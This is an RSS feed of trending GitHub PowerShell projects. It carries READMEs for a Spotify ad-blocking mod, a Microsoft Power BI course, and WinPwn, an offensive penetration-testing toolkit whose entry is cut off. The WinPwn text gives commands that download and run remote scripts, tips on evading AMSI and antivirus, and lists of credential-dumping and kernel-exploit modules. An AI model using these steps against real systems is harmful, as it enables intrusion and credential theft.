<?xml version="1.0" encoding="UTF-8"?><feed xmlns="http://www.w3.org/2005/Atom">
  <title>GitHub PowerShell Weekly Trending</title>
  <id>http://mshibanami.github.io/GitHubTrendingRSS</id>
  <updated>2022-09-04T01:46:27Z</updated>
  <subtitle>Weekly Trending of PowerShell in GitHub</subtitle>
  <link href="http://mshibanami.github.io/GitHubTrendingRSS"></link>
  <entry>
    <title>amd64fox/SpotX</title>
    <updated>2022-09-04T01:46:27Z</updated>
    <id>tag:github.com,2022-09-04:/amd64fox/SpotX</id>
    <link href="https://github.com/amd64fox/SpotX" rel="alternate"></link>
    <summary type="html">&lt;p&gt;Blocking ads and updates for the desktop version of Spotify, disabling podcasts and something else.&lt;/p&gt;&lt;hr&gt;&lt;p align=&#34;center&#34;&gt; &lt;a href=&#34;https://github.com/amd64fox/SpotX/releases&#34;&gt;&lt;img src=&#34;https://github.com/amd64fox/SpotX/raw/main/.github/Pic/logo.png&#34;&gt; &lt;/a&gt;&lt;/p&gt;&#xA;&lt;a href=&#34;https://github.com/amd64fox/SpotX/releases&#34;&gt; &lt;/a&gt;&#xA;&lt;p align=&#34;center&#34;&gt;&lt;a href=&#34;https://github.com/amd64fox/SpotX/releases&#34;&gt; &lt;/a&gt;&lt;a href=&#34;https://t.me/spotify_windows_mod&#34;&gt;&lt;img src=&#34;https://raw.githubusercontent.com/amd64fox/SpotX/main/.github/Pic/Shields/tg.svg?sanitize=true&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://www.youtube.com/results?search_query=https%3A%2F%2Fgithub.com%2Famd64fox%2FSpotX&#34;&gt;&lt;img src=&#34;https://raw.githubusercontent.com/amd64fox/SpotX/main/.github/Pic/Shields/youtube.svg?sanitize=true&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://cutt.ly/8EH6NuH&#34;&gt;&lt;img src=&#34;https://raw.githubusercontent.com/amd64fox/SpotX/main/.github/Pic/Shields/excel.svg?sanitize=true&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://github.com/amd64fox/SpotX/discussions/111&#34;&gt;&lt;img src=&#34;https://raw.githubusercontent.com/amd64fox/SpotX/main/.github/Pic/Shields/faq.svg?sanitize=true&#34;&gt;&lt;/a&gt; &lt;/p&gt; &#xA;&lt;h2&gt; &#xA; &lt;div align=&#34;center&#34;&gt;&#xA;  &lt;b&gt; Modified Spotify Client for Windows &lt;/b&gt;&#xA; &lt;/div&gt; &lt;/h2&gt; &#xA;&lt;h1&gt;System requirements&lt;/h1&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;strong&gt;OS: Windows 7-11&lt;/strong&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;Spotify: Recommended official version &lt;a href=&#34;https://cutt.ly/8EH6NuH&#34;&gt;1.1.93.896&lt;/a&gt;&lt;/strong&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;For Windows Desktop only (Microsoft store version is not suitable).&lt;/strong&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;PowerShell: 3 or higher&lt;/strong&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h1&gt;Features&lt;/h1&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;strong&gt;Blocks all banner, video and audio ads in the client&lt;/strong&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;Unlocks the skip function of any track&lt;/strong&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;Full screen mode activated&lt;/strong&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;Hidden podcasts and episodes from the homepage (optional)&lt;/strong&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;Blocks automatic updates (optional)&lt;/strong&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;Automatic &lt;a href=&#34;https://github.com/amd64fox/SpotX/discussions/2&#34;&gt;cache clearing&lt;/a&gt; (optional)&lt;/strong&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;Enabled &lt;a href=&#34;https://github.com/amd64fox/SpotX/discussions/50#discussion-4108773&#34;&gt;enhance playlist&lt;/a&gt;&lt;/strong&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;Enabled &lt;a href=&#34;https://github.com/amd64fox/SpotX/discussions/50#discussioncomment-2851482&#34;&gt;enhance liked songs UI&lt;/a&gt;&lt;/strong&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;Enabled &lt;a href=&#34;https://github.com/amd64fox/SpotX/discussions/50#discussioncomment-2851485&#34;&gt;new lyrics&lt;/a&gt;&lt;/strong&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;Enabled &lt;a href=&#34;https://github.com/amd64fox/SpotX/discussions/50#discussioncomment-2851591&#34;&gt;a condensed discography shelf on artist pages&lt;/a&gt;&lt;/strong&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;Enabled &lt;a href=&#34;https://github.com/amd64fox/SpotX/discussions/50#discussioncomment-2996165&#34;&gt;Ignore In Recommendations&lt;/a&gt;&lt;/strong&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;Enabled &lt;a href=&#34;https://github.com/amd64fox/SpotX/discussions/50#discussioncomment-3179778&#34;&gt;Equalizer&lt;/a&gt;&lt;/strong&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;Enabled &lt;a href=&#34;https://github.com/amd64fox/SpotX/discussions/50#discussioncomment-3179782&#34;&gt;new device picker panel&lt;/a&gt;&lt;/strong&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;Activated &lt;a href=&#34;https://github.com/amd64fox/SpotX/discussions/50#discussioncomment-2853981&#34;&gt;&#34;Made For You&#34; in the left sidebar&lt;/a&gt;&lt;/strong&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;Disabled Sentry (Prevented Sentry from sending console log/error/warning to Spotify developers)&lt;/strong&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;Disabled logging (Stopped various elements to log user interaction)&lt;/strong&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;Removed RTL rules (Removed all right-to-left CSS rules to simplify CSS files)&lt;/strong&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;Code minification&lt;/strong&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h1&gt;Fast installation / Update&lt;/h1&gt; &#xA;&lt;h3&gt;Choose installation type:&lt;/h3&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;&lt;small&gt;Usual installation&lt;/small&gt;&lt;/summary&gt;&#xA; &lt;p&gt; &lt;/p&gt;&#xA; &lt;h4&gt;During installation, you need to confirm some actions, also contains:&lt;/h4&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt;All &lt;a href=&#34;https://github.com/amd64fox/SpotX/discussions/50&#34;&gt;experimental features&lt;/a&gt; included&lt;/li&gt; &#xA; &lt;/ul&gt; &#xA; &lt;h4&gt; &lt;/h4&gt; &#xA; &lt;h4&gt;Just download and run &lt;a href=&#34;https://raw.githack.com/amd64fox/SpotX/main/Install.bat&#34;&gt;Install.bat&lt;/a&gt;&lt;/h4&gt; &#xA; &lt;p&gt;or&lt;/p&gt; &#xA; &lt;h4&gt;Run The following command in PowerShell:&lt;/h4&gt; &#xA; &lt;pre&gt;&lt;code class=&#34;language-ps1&#34;&gt;[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; (iwr -useb &#39;https://raw.githubusercontent.com/amd64fox/SpotX/main/Install.ps1&#39;).Content | iex&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;&lt;small&gt;Automatic basic installation&lt;/small&gt;&lt;/summary&gt;&#xA; &lt;p&gt; &lt;/p&gt;&#xA; &lt;h4&gt;Automatic basic installation without confirmation, what does it do?&lt;/h4&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt;Automatic removal of Spotify MS if it was found&lt;/li&gt; &#xA;  &lt;li&gt;Automatic installation of the recommended version of Spotify (if another client has already been found, it will be installed over)&lt;/li&gt; &#xA;  &lt;li&gt;After the installation is completed, the client will autorun&lt;/li&gt; &#xA; &lt;/ul&gt; &#xA; &lt;h4&gt; &lt;/h4&gt; &#xA; &lt;h4&gt;Just download and run &lt;a href=&#34;https://raw.githack.com/amd64fox/SpotX/main/scripts/Install_Basic.bat&#34;&gt;Install_Basic.bat&lt;/a&gt;&lt;/h4&gt; &#xA; &lt;p&gt;or&lt;/p&gt; &#xA; &lt;h4&gt;Run The following command in PowerShell:&lt;/h4&gt; &#xA; &lt;pre&gt;&lt;code class=&#34;language-ps1&#34;&gt;[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; iex &#34;&amp;amp; { $((iwr -useb &#39;https://raw.githubusercontent.com/amd64fox/SpotX/main/Install.ps1&#39;).Content) } -confirm_uninstall_ms_spoti -confirm_spoti_recomended_over -podcasts_on -cache_off -block_update_off -exp_standart -hide_col_icon_off -start_spoti&#34;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;&lt;small&gt;Automatic full installation&lt;/small&gt;&lt;/summary&gt;&#xA; &lt;p&gt; &lt;/p&gt;&#xA; &lt;h4&gt;Automatic installation without confirmation, what does it do?&lt;/h4&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt;Automatic removal of Spotify MS if it was found&lt;/li&gt; &#xA;  &lt;li&gt;Automatic installation of the recommended version of Spotify (if another client has already been found, it will be installed over)&lt;/li&gt; &#xA;  &lt;li&gt;Removal of podcasts from the main page&lt;/li&gt; &#xA;  &lt;li&gt;Automatic blocking of Spotify updates&lt;/li&gt; &#xA;  &lt;li&gt;All &lt;a href=&#34;https://github.com/amd64fox/SpotX/discussions/50&#34;&gt;experimental features&lt;/a&gt; included&lt;/li&gt; &#xA;  &lt;li&gt;After the installation is completed, the client will autorun.&lt;/li&gt; &#xA; &lt;/ul&gt; &#xA; &lt;h4&gt; &lt;/h4&gt; &#xA; &lt;h4&gt;Just download and run &lt;a href=&#34;https://raw.githack.com/amd64fox/SpotX/main/scripts/Install_Auto.bat&#34;&gt;Install_Auto.bat&lt;/a&gt;&lt;/h4&gt; &#xA; &lt;p&gt;or&lt;/p&gt; &#xA; &lt;h4&gt;Run The following command in PowerShell:&lt;/h4&gt; &#xA; &lt;pre&gt;&lt;code class=&#34;language-ps1&#34;&gt;[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; iex &#34;&amp;amp; { $((iwr -useb &#39;https://raw.githubusercontent.com/amd64fox/SpotX/main/Install.ps1&#39;).Content) } -confirm_uninstall_ms_spoti -confirm_spoti_recomended_over -podcasts_off -cache_off -block_update_on -start_spoti&#34;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;&lt;small&gt;Installing with Scoop&lt;/small&gt;&lt;/summary&gt;&#xA; &lt;p&gt; &lt;/p&gt;&#xA; &lt;h4&gt;Installing SpotX via the Scoop package manager includes:&lt;/h4&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt;Automatic removal of Spotify MS if it was found&lt;/li&gt; &#xA;  &lt;li&gt;Automatic installation of the recommended version of Spotify (if another client has already been found, it will be installed over)&lt;/li&gt; &#xA;  &lt;li&gt;Removal of podcasts from the main page&lt;/li&gt; &#xA;  &lt;li&gt;Automatic blocking of Spotify updates&lt;/li&gt; &#xA;  &lt;li&gt;All &lt;a href=&#34;https://github.com/amd64fox/SpotX/discussions/50&#34;&gt;experimental features&lt;/a&gt; included&lt;/li&gt; &#xA; &lt;/ul&gt; &#xA; &lt;h4&gt; &lt;/h4&gt; &#xA; &lt;h4&gt;Installing SpotX with Scoop&lt;/h4&gt; &#xA; &lt;p&gt;Just run these commands in the command prompt or powershell: &lt;br&gt; &lt;br&gt;&lt;code&gt;scoop bucket add nonportable&lt;/code&gt; &lt;br&gt;&lt;code&gt;scoop install spotx-np&lt;/code&gt;&lt;/p&gt; &#xA; &lt;h4&gt;Updating SpotX with Scoop&lt;/h4&gt; &#xA; &lt;p&gt;To update SpotX or check for updates run this command in the command prompt or powershell:&lt;/p&gt; &#xA; &lt;p&gt;&lt;code&gt;scoop update spotx-np&lt;/code&gt;&lt;/p&gt; &#xA; &lt;h4&gt;Uninstalling SpotX with Scoop&lt;/h4&gt; &#xA; &lt;p&gt;To fully uninstall SpotX and Spotify run this command in the command prompt or powershell:&lt;/p&gt; &#xA; &lt;p&gt;&lt;code&gt;scoop uninstall spotx-np&lt;/code&gt;&lt;/p&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;&lt;small&gt;Installation for premium&lt;/small&gt;&lt;/summary&gt;&#xA; &lt;p&gt; &lt;/p&gt;&#xA; &lt;h4&gt;Usual installation only without ad blocking, for those who have a premium account, also contains:&lt;/h4&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt;All &lt;a href=&#34;https://github.com/amd64fox/SpotX/discussions/50&#34;&gt;experimental features&lt;/a&gt; included&lt;/li&gt; &#xA; &lt;/ul&gt; &#xA; &lt;h4&gt; &lt;/h4&gt; &#xA; &lt;h4&gt;Just download and run &lt;a href=&#34;https://raw.githack.com/amd64fox/SpotX/main/scripts/Install_Prem.bat&#34;&gt;Install_Prem.bat&lt;/a&gt;&lt;/h4&gt; &#xA; &lt;p&gt;or&lt;/p&gt; &#xA; &lt;h4&gt;Run The following command in PowerShell:&lt;/h4&gt; &#xA; &lt;pre&gt;&lt;code class=&#34;language-ps1&#34;&gt;[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; iex &#34;&amp;amp; { $((iwr -useb &#39;https://raw.githubusercontent.com/amd64fox/SpotX/main/Install.ps1&#39;).Content) } -premium&#34;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;&lt;small&gt;Installing with parameters&lt;/small&gt;&lt;/summary&gt;&#xA; &lt;p&gt; &lt;/p&gt;&#xA; &lt;p&gt;You can specify various parameters for a more flexible installation, more &lt;a href=&#34;https://github.com/amd64fox/SpotX/discussions/60&#34;&gt;details here&lt;/a&gt;&lt;/p&gt; &#xA;&lt;/details&gt; &#xA;&lt;h1&gt;Uninstall&lt;/h1&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Just run &lt;a href=&#34;https://raw.githack.com/amd64fox/SpotX/main/Uninstall.bat&#34;&gt;Uninstall.bat&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;or&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Reinstall Spotify (&lt;a href=&#34;https://github.com/amd64fox/Uninstall-Spotify&#34;&gt;Full uninstall Spotify&lt;/a&gt; recommended)&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h1&gt;FAQ&lt;/h1&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Read &lt;a href=&#34;https://github.com/amd64fox/SpotX/discussions/111&#34;&gt;FAQ&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h1&gt;Credits&lt;/h1&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;The repository is based on &lt;a href=&#34;https://github.com/mrpond/BlockTheSpot&#34;&gt;BlockTheSpot&lt;/a&gt;, and also some tricks were taken from &lt;a href=&#34;https://github.com/khanhas/spicetify-cli&#34;&gt;spicetify-cli&lt;/a&gt;, many thanks to the contributors&lt;/li&gt; &#xA;&lt;/ul&gt;</summary>
  </entry>
  <entry>
    <title>MicrosoftLearning/PL-300-Microsoft-Power-BI-Data-Analyst</title>
    <updated>2022-09-04T01:46:27Z</updated>
    <id>tag:github.com,2022-09-04:/MicrosoftLearning/PL-300-Microsoft-Power-BI-Data-Analyst</id>
    <link href="https://github.com/MicrosoftLearning/PL-300-Microsoft-Power-BI-Data-Analyst" rel="alternate"></link>
    <summary type="html">&lt;p&gt;&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;PL-300: Microsoft Power BI Data Analyst&lt;/h1&gt; &#xA;&lt;p&gt;This repository contains the hands-on lab exercises for Microsoft course &lt;a href=&#34;https://docs.microsoft.com/en-us/learn/certifications/courses/PL-300T00&#34;&gt;PL-300: Microsoft Power BI Data Analyst&lt;/a&gt;. The labs are designed to accompany the learning materials and enable learners to practice using the technologies they describe.&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;strong&gt;Are you a MCT?&lt;/strong&gt; - Have a look at our &lt;a href=&#34;https://microsoftlearning.github.io/MCT-User-Guide/&#34;&gt;GitHub User Guide for MCTs&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;Need to manually build the lab instructions?&lt;/strong&gt; - Instructions are available in the &lt;a href=&#34;https://github.com/MicrosoftLearning/Docker-Build&#34;&gt;MicrosoftLearning/Docker-Build&lt;/a&gt; repository&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;Do you need a refresher on which labs go with which module?&lt;/strong&gt; - Check out the &lt;a href=&#34;https://microsoftlearning.github.io/PL-300-Microsoft-Power-BI-Data-Analyst/&#34;&gt;GitHub Page&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;What are we doing?&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt; &lt;p&gt;To support this course, we will need to make frequent updates to the course content to keep it current with the Power BI services used in the course. We are publishing the lab instructions and lab files on GitHub to allow for open contributions between the course authors and MCTs to keep the content current with changes in the Power BI platform.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;We hope that this brings a sense of collaboration to the labs like we&#39;ve never had before - when Power BI changes and you find it first during a live delivery, go ahead and make an enhancement right in the lab source. Help your fellow MCTs.&lt;/p&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;How should I use these files relative to the released MOC files?&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt; &lt;p&gt;The instructor handbook and PowerPoints are still going to be your primary source for teaching the course content.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;These files on GitHub are designed to be used in conjunction with the student handbook, but are in GitHub as a central repository so MCTs and course authors can have a shared source for the latest lab files.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;It will be recommended that for every delivery, trainers check GitHub for any changes that may have been made to support the latest Azure services, and get the latest files for their delivery.&lt;/p&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;What about changes to the student handbook?&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;We will review the student handbook on a quarterly basis and update through the normal MOC release channels as needed.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;How do I contribute?&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt; &lt;p&gt;Any MCT can submit a pull request to the code or content in the GitHub repro, Microsoft and the course author will triage and include content and lab code changes as needed.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;You can submit bugs, changes, improvement and ideas. Find a new Power BI feature before we have? Submit a new demo!&lt;/p&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Notes&lt;/h2&gt; &#xA;&lt;h3&gt;Classroom Materials&lt;/h3&gt; &#xA;&lt;p&gt;It is strongly recommended that MCTs and Partners access these materials and in turn, provide them separately to students. Pointing students directly to GitHub to access Lab steps as part of an ongoing class will require them to access yet another UI as part of the course, contributing to a confusing experience for the student. An explanation to the student regarding why they are receiving separate Lab instructions can highlight the nature of an always-changing cloud-based interface and platform. Microsoft Learning support for accessing files on GitHub and support for navigation of the GitHub site is limited to MCTs teaching this course only.&lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>S3cur3Th1sSh1t/WinPwn</title>
    <updated>2022-09-04T01:46:27Z</updated>
    <id>tag:github.com,2022-09-04:/S3cur3Th1sSh1t/WinPwn</id>
    <link href="https://github.com/S3cur3Th1sSh1t/WinPwn" rel="alternate"></link>
    <summary type="html">&lt;p&gt;Automation for internal Windows Penetrationtest / AD-Security&lt;/p&gt;&lt;hr&gt;&lt;p&gt;&lt;a href=&#34;https://blockchain.info/address/1MXReD1F4w5SUXK3phLVJ5M8KrXJHfecmZ&#34;&gt;&lt;img src=&#34;https://img.shields.io/badge/Donate-Bitcoin-blue.svg?style=flat&#34; alt=&#34;&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h1&gt;WinPwn&lt;/h1&gt; &#xA;&lt;p&gt;In many past internal penetration tests I often had problems with the existing Powershell Recon / Exploitation scripts due to missing proxy support. I also often ran the same scripts one after the other to get information about the current system and/or the domain. To automate as many internal penetrationtest processes (reconnaissance as well as exploitation) and for the proxy reason I wrote my own script with automatic proxy recognition and integration. The script is mostly based on well-known large other offensive security Powershell projects.&lt;/p&gt; &#xA;&lt;p&gt;Any suggestions, feedback, Pull requests and comments are welcome!&lt;/p&gt; &#xA;&lt;p&gt;Just Import the Modules with:&lt;/p&gt; &#xA;&lt;p&gt;&lt;code&gt;Import-Module .\WinPwn.ps1&lt;/code&gt; or &lt;code&gt;iex(new-object net.webclient).downloadstring(&#39;https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/master/WinPwn.ps1&#39;)&lt;/code&gt;&lt;/p&gt; &#xA;&lt;p&gt;To bypass AMSI take one of the existing &lt;a href=&#34;https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell&#34;&gt;bypass techniques&lt;/a&gt;, find the AMSI &lt;a href=&#34;https://github.com/RythmStick/AMSITrigger&#34;&gt;trigger&lt;/a&gt; and manually change it in the bypass function or encode the trigger string. Alternatively obfuscate the whole script.&lt;/p&gt; &#xA;&lt;p&gt;To spawn a new protected PowerShell Process that is set to run with BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON process mitigation:&lt;/p&gt; &#xA;&lt;p&gt;&lt;code&gt;iex(new-object net.webclient).downloadstring(&#39;https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/master/Obfus_SecurePS_WinPwn.ps1&#39;)&lt;/code&gt;&lt;/p&gt; &#xA;&lt;p&gt;This prevents non-microsoft DLLs (e.g. AV/EDR products) to load into PowerShell - unless they have a Cross-Signed Microsoft certificate.&lt;/p&gt; &#xA;&lt;p&gt;If you find yourself stuck on a windows system with no internet access - no problem at all, just use &lt;code&gt;Offline_Winpwn.ps1&lt;/code&gt;, the most important scripts and executables are included.&lt;/p&gt; &#xA;&lt;p&gt;Functions available after Import:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt; &lt;h4&gt;&lt;code&gt;WinPwn&lt;/code&gt; -&amp;gt; Menu to choose attacks:&lt;/h4&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/master/images/WinPwn.JPG&#34; alt=&#34;alt text&#34;&gt;&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt; &lt;h4&gt;&lt;code&gt;Inveigh&lt;/code&gt; -&amp;gt; Executes Inveigh in a new Console window , SMB-Relay attacks with Session management (Invoke-TheHash) integrated&lt;/h4&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;h4&gt;&lt;code&gt;SessionGopher&lt;/code&gt; -&amp;gt; Executes Sessiongopher Asking you for parameters&lt;/h4&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;h4&gt;&lt;code&gt;Kittielocal&lt;/code&gt; -&amp;gt;&lt;/h4&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Obfuscated Invoke-Mimikatz version&lt;/li&gt; &#xA;   &lt;li&gt;Safetykatz in memory&lt;/li&gt; &#xA;   &lt;li&gt;Dump lsass using rundll32 technique&lt;/li&gt; &#xA;   &lt;li&gt;Download and run obfuscated Lazagne&lt;/li&gt; &#xA;   &lt;li&gt;Dump Browser credentials&lt;/li&gt; &#xA;   &lt;li&gt;Customized Mimikittenz Version&lt;/li&gt; &#xA;   &lt;li&gt;Exfiltrate Wifi-Credentials&lt;/li&gt; &#xA;   &lt;li&gt;Dump SAM-File NTLM Hashes&lt;/li&gt; &#xA;   &lt;li&gt;SharpCloud&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;h4&gt;&lt;code&gt;Localreconmodules&lt;/code&gt; -&amp;gt;&lt;/h4&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Collect installed software, vulnerable software, Shares, network information, groups, privileges and many more&lt;/li&gt; &#xA;   &lt;li&gt;Check typical vulns like SMB-Signing, LLMNR Poisoning, MITM6 , WSUS over HTTP&lt;/li&gt; &#xA;   &lt;li&gt;Checks the Powershell event logs for credentials or other sensitive informations&lt;/li&gt; &#xA;   &lt;li&gt;Collect Browser Credentials and history&lt;/li&gt; &#xA;   &lt;li&gt;Search for passwords in the registry and on the file system&lt;/li&gt; &#xA;   &lt;li&gt;Find sensitive files (config files, RDP files, keepass Databases)&lt;/li&gt; &#xA;   &lt;li&gt;Search for .NET Binaries on the local system&lt;/li&gt; &#xA;   &lt;li&gt;Optional: Get-Computerdetails (Powersploit) and PSRecon&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;h4&gt;&lt;code&gt;Domainreconmodules&lt;/code&gt; -&amp;gt;&lt;/h4&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Collect various domain informations for manual review&lt;/li&gt; &#xA;   &lt;li&gt;Find AD-Passwords in description fields&lt;/li&gt; &#xA;   &lt;li&gt;Search for potential sensitive domain share files&lt;/li&gt; &#xA;   &lt;li&gt;Unconstrained delegation systems/users are enumerated&lt;/li&gt; &#xA;   &lt;li&gt;Generate Bloodhound Report&lt;/li&gt; &#xA;   &lt;li&gt;MS17-10 Scanner for domain systems&lt;/li&gt; &#xA;   &lt;li&gt;Bluekeep Scanner for domain systems&lt;/li&gt; &#xA;   &lt;li&gt;SQL Server discovery and Auditing functions - PowerUpSQL&lt;/li&gt; &#xA;   &lt;li&gt;MS-RPRN Check for Domaincontrollers or all systems&lt;/li&gt; &#xA;   &lt;li&gt;Group Policy Audit with Grouper2&lt;/li&gt; &#xA;   &lt;li&gt;An AD-Report is generated in CSV Files (or XLS if excel is installed) with ADRecon&lt;/li&gt; &#xA;   &lt;li&gt;Check Printers for common vulns&lt;/li&gt; &#xA;   &lt;li&gt;Search for Resource-Based Constrained Delegation attack paths&lt;/li&gt; &#xA;   &lt;li&gt;Check all DCs for zerologon - CVE-2020-1472&lt;/li&gt; &#xA;   &lt;li&gt;And more, just take a look&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;h4&gt;&lt;code&gt;Privescmodules&lt;/code&gt;&lt;/h4&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;itm4ns Invoke-PrivescCheck&lt;/li&gt; &#xA;   &lt;li&gt;winPEAS&lt;/li&gt; &#xA;   &lt;li&gt;Powersploits PowerUp Allchecks, Sherlock, GPPPasswords&lt;/li&gt; &#xA;   &lt;li&gt;Dll Hijacking, File Permissions, Registry permissions and weak keys, Rotten/Juicy Potato Check&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;h4&gt;&lt;code&gt;kernelexploits&lt;/code&gt; -&amp;gt;&lt;/h4&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;MS15-077 - (XP/Vista/Win7/Win8/2000/2003/2008/2012) x86 only!&lt;/li&gt; &#xA;   &lt;li&gt;MS16-032 - (2008/7/8/10/2012)!&lt;/li&gt; &#xA;   &lt;li&gt;MS16-135 - (WS2k16 only)!&lt;/li&gt; &#xA;   &lt;li&gt;CVE-2018-8120 - May 2018, Windows 7 SP1/2008 SP2,2008 R2 SP1!&lt;/li&gt; &#xA;   &lt;li&gt;CVE-2019-0841 - April 2019!&lt;/li&gt; &#xA;   &lt;li&gt;CVE-2019-1069 - Polarbear Hardlink, Credentials needed - June 2019!&lt;/li&gt; &#xA;   &lt;li&gt;CVE-2019-1129/1130 - Race Condition, multiples cores needed - July 2019!&lt;/li&gt; &#xA;   &lt;li&gt;CVE-2019-1215 - September 2019 - x64 only!&lt;/li&gt; &#xA;   &lt;li&gt;CVE-2020-0638 - February 2020 - x64 only!&lt;/li&gt; &#xA;   &lt;li&gt;CVE-2020-0796 - SMBGhost&lt;/li&gt; &#xA;   &lt;li&gt;CVE-2020-0787 - March 2020 - all windows versions&lt;/li&gt; &#xA;   &lt;li&gt;CVE-2021-34527/CVE-2021-1675 - June 2021 - PrintNightmare&lt;/li&gt; &#xA;   &lt;li&gt;CVE-2021-40449 - CallbackHell - October 2021&lt;/li&gt; &#xA;   &lt;li&gt;Juicy-Potato Exploit&lt;/li&gt; &#xA;   &lt;li&gt;itm4ns Printspoofer&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;h4&gt;&lt;code&gt;UACBypass&lt;/code&gt; 